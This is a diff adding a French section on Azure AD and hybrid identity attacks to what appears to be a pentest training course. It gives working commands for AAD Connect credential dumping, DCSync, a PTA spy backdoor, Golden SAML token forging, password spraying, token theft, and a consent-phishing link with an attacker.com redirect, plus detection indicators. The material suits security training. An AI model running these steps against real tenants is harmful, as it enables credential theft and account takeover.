@@ -868,6 +868,276 @@ Set-ADDomain -Identity "yourcompany.local" -Replace @{"ms-DS-MachineAccountQuota
 
 ---
 
+## 7. Azure AD & Environnements Hybrides
+
+Les environnements modernes combinent souvent Active Directory on-premise avec Azure Active Directory (Entra ID). Cette section couvre les attaques spécifiques aux environnements hybrides.
+
+### 7.1 Architecture Hybride
+
+```mermaid
+flowchart TB
+    subgraph onprem["On-Premise"]
+        DC[Domain Controller]
+        ADCS[ADCS Server]
+        AADConnect[Azure AD Connect]
+    end
+
+    subgraph azure["Azure Cloud"]
+        AzureAD[Azure AD / Entra ID]
+        Conditional[Conditional Access]
+        PIM[Privileged Identity Management]
+    end
+
+    DC <-->|"Password Hash Sync<br/>Pass-through Auth<br/>Federation"| AADConnect
+    AADConnect <-->|"Sync"| AzureAD
+    AzureAD --> Conditional
+    AzureAD --> PIM
+
+    style DC fill:#3498db,color:#fff
+    style AzureAD fill:#0078d4,color:#fff
+    style AADConnect fill:#e74c3c,color:#fff
+```
+
+**Types de synchronisation :**
+
+| Mode | Description | Risque |
+|------|-------------|--------|
+| **Password Hash Sync (PHS)** | Hashes synchronisés vers Azure | Compromis cloud = compromis on-prem |
+| **Pass-through Auth (PTA)** | Auth validée on-prem | Agents PTA = cibles prioritaires |
+| **Federation (ADFS)** | Tokens SAML signés on-prem | Golden SAML possible |
+
+### 7.2 Énumération Azure AD
+
+**Depuis l'extérieur (non authentifié) :**
+
+```bash
+# Vérifier si un tenant existe
+curl "https://login.microsoftonline.com/[DOMAIN]/v2.0/.well-known/openid-configuration"
+
+# Énumérer les utilisateurs (si user enumeration activé)
+# Réponses différentes pour utilisateurs valides/invalides
+python3 o365creeper.py -f users.txt -d target.com
+
+# AADInternals (PowerShell)
+Install-Module AADInternals
+Import-Module AADInternals
+
+# Informations sur le tenant
+Invoke-AADIntReconAsOutsider -DomainName "target.com"
+```
+
+**Depuis l'intérieur (authentifié) :**
+
+```bash
+# ROADtools - Énumération complète
+pip install roadrecon
+roadrecon auth -u user@target.com -p 'Password'
+roadrecon gather
+roadrecon gui  # Interface web http://localhost:5000
+
+# AzureHound - BloodHound pour Azure
+# Collecter les données
+azurehound -u user@target.com -p 'Password' list --tenant target.com -o output.json
+# Importer dans BloodHound
+
+# Az CLI
+az login
+az ad user list --output table
+az ad group list --output table
+az role assignment list --all --output table
+```
+
+**PowerShell Az Module :**
+
+```powershell
+# Connexion
+Connect-AzAccount
+Connect-AzureAD
+
+# Énumération utilisateurs
+Get-AzureADUser -All $true | Select-Object DisplayName, UserPrincipalName, UserType
+Get-AzureADUser -All $true | Where-Object {$_.UserType -eq "Guest"}
+
+# Énumération groupes
+Get-AzureADGroup -All $true
+Get-AzureADGroupMember -ObjectId "GROUP_ID"
+
+# Rôles privilégiés
+Get-AzureADDirectoryRole
+Get-AzureADDirectoryRoleMember -ObjectId "ROLE_ID"
+
+# Applications et Service Principals
+Get-AzureADApplication -All $true
+Get-AzureADServicePrincipal -All $true
+```
+
+### 7.3 Attaque Azure AD Connect
+
+!!! danger "Azure AD Connect = Cible Prioritaire"
+    Le serveur Azure AD Connect possède les credentials pour synchroniser tous les utilisateurs. Sa compromission donne accès aux hashes de tout le domaine.
+
+**Extraction des credentials AAD Connect :**
+
+```powershell
+# Sur le serveur Azure AD Connect (requiert admin local)
+# Méthode 1 : AADInternals
+Import-Module AADInternals
+Get-AADIntSyncCredentials
+
+# Résultat :
+# Name       : YOURCOMPANY.LOCAL
+# UserName   : MSOL_[HEX]
+# Password   : [PASSWORD_EN_CLAIR]
+# Domain     : YOURCOMPANY.LOCAL
+
+# Ce compte MSOL_* a des droits DCSync!
+```
+
+```bash
+# Méthode 2 : Depuis Linux avec les fichiers de config
+# Nécessite accès aux fichiers de config AAD Connect
+python3 adconnectdump.py -p 'LocalMachine' YOURCOMPANY/admin@srv-aadconnect
+```
+
+**Exploitation du compte MSOL :**
+
+```bash
+# DCSync avec le compte MSOL (a les droits de réplication)
+secretsdump.py 'YOURCOMPANY.LOCAL/MSOL_abc123:PasswordHere@dc01.yourcompany.local' -just-dc
+```
+
+### 7.4 PTA Agent Abuse
+
+Le Pass-through Authentication utilise des agents on-premise. Leur compromission permet de valider n'importe quelle authentification.
+
+```powershell
+# Sur un serveur avec l'agent PTA installé
+# L'agent exécute des requêtes d'auth - on peut les intercepter
+
+# Avec AADInternals - installer un "backdoor"
+Install-AADIntPTASpy
+
+# Toutes les authentifications sont loggées
+Get-AADIntPTASpyLog
+
+# Résultat : username + password en clair de chaque auth!
+```
+
+### 7.5 Golden SAML Attack
+
+Si l'organisation utilise ADFS (Federation), compromettre le certificat de signature SAML permet de forger des tokens pour n'importe quel utilisateur.
+
+```mermaid
+flowchart LR
+    subgraph attack["Golden SAML Attack"]
+        A[Compromis ADFS] --> B[Extraire Certificat<br/>de Signature]
+        B --> C[Forger Token SAML]
+        C --> D[Accès Azure AD<br/>comme n'importe qui]
+    end
+
+    style A fill:#e74c3c,color:#fff
+    style D fill:#9b59b6,color:#fff
+```
+
+```powershell
+# Sur le serveur ADFS (requiert admin)
+# Extraire le certificat de signature
+Export-AADIntADFSSigningCertificate
+
+# Forger un token SAML (depuis n'importe où)
+$saml = New-AADIntSAMLToken -ImmutableID "USER_IMMUTABLE_ID" `
+    -PfxFileName "exported_cert.pfx" `
+    -PfxPassword "password" `
+    -Issuer "http://adfs.yourcompany.local/adfs/services/trust"
+
+# S'authentifier avec le token forgé
+$at = Get-AADIntAccessTokenWithSAML -SAMLToken $saml -Resource "https://graph.microsoft.com"
+
+# Accès en tant que l'utilisateur cible!
+```
+
+### 7.6 Seamless SSO Abuse
+
+Azure AD Seamless SSO utilise un compte machine `AZUREADSSOACC` dont le hash Kerberos permet de forger des tickets.
+
+```powershell
+# DCSync pour obtenir le hash du compte AZUREADSSOACC
+lsadump::dcsync /user:AZUREADSSOACC$ /domain:yourcompany.local
+
+# Utiliser le hash pour créer des Silver Tickets vers Azure AD
+```
+
+### 7.7 Cloud-Only Attacks
+
+**Password Spray Azure AD :**
+
+```bash
+# MSOLSpray
+python3 MSOLSpray.py --userlist users.txt --password 'Spring2024!' --url https://login.microsoftonline.com
+
+# Spray avec Trevorspray (évite les lockouts)
+trevorspray -u users.txt -p passwords.txt --url https://login.microsoftonline.com/TENANT_ID
+```
+
+**Token Theft :**
+
+```bash
+# Vol de tokens depuis le navigateur
+# Les tokens sont stockés localement et peuvent être extraits
+
+# ROADtoken - Extraction de tokens
+roadtx gettokens --refresh-token STOLEN_REFRESH_TOKEN
+
+# Utiliser le token volé
+az login --use-device-code  # Coller le token
+```
+
+**Application Consent Phishing :**
+
+```
+# Créer une application malveillante avec des permissions élevées
+# Envoyer un lien de consent à la victime
+# Si la victime consent, l'attaquant a accès aux données
+
+https://login.microsoftonline.com/common/oauth2/authorize?
+    client_id=MALICIOUS_APP_ID&
+    response_type=code&
+    scope=https://graph.microsoft.com/.default&
+    redirect_uri=https://attacker.com/callback
+```
+
+### 7.8 Outils Azure AD
+
+| Outil | Description |
+|-------|-------------|
+| **ROADtools** | Suite d'énumération et exploitation Azure AD |
+| **AzureHound** | Collecteur BloodHound pour Azure |
+| **AADInternals** | Module PowerShell complet pour Azure AD |
+| **MSOLSpray** | Password spraying Azure AD |
+| **TokenTactics** | Manipulation de tokens Azure |
+| **GraphRunner** | Post-exploitation Microsoft Graph API |
+| **Stormspotter** | Visualisation des relations Azure |
+
+### 7.9 Détection Environnements Hybrides
+
+| Attaque | Indicateurs | Event ID |
+|---------|-------------|----------|
+| AAD Connect dump | Accès base de données ADSync | Local : 4663 |
+| PTA Backdoor | Modifications fichiers agent | Sysmon Event 11 |
+| Golden SAML | Tokens avec claims inhabituels | Azure AD Sign-in Logs |
+| Password Spray | Échecs multiples même IP | Azure AD Sign-in Risk |
+| Consent Phishing | Nouveaux consentements apps | Azure AD Audit Logs |
+
+```kusto
+// Détection Password Spray - KQL (Azure Sentinel)
+SigninLogs
+| where ResultType == "50126"  // Invalid username or password
+| summarize FailureCount = count() by IPAddress, bin(TimeGenerated, 1h)
+| where FailureCount > 10
+```
+
+---
+
 ## Exercice Pratique
 
 !!! example "Exercice : Compromission d'un Domaine AD via 3 Chemins"
